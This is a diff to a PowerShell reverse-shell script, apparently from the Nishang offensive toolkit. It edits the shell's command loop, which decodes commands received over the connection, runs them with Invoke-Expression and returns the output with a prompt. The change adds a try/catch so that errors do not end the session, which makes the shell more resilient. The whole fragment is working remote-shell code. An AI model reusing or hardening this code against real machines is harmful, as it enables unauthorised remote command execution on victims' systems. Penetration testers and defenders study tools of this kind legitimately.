@@ -92,8 +92,15 @@ https://github.com/samratashok/nishang
             $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
             $data = $EncodedText.GetString($bytes,0, $i)
         
-            #Execute the command on the target.
-            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            # Catch and swallow any exceptions to prevent closing the shell
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+            }
 
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
             $x = ($error[0] | Out-String)
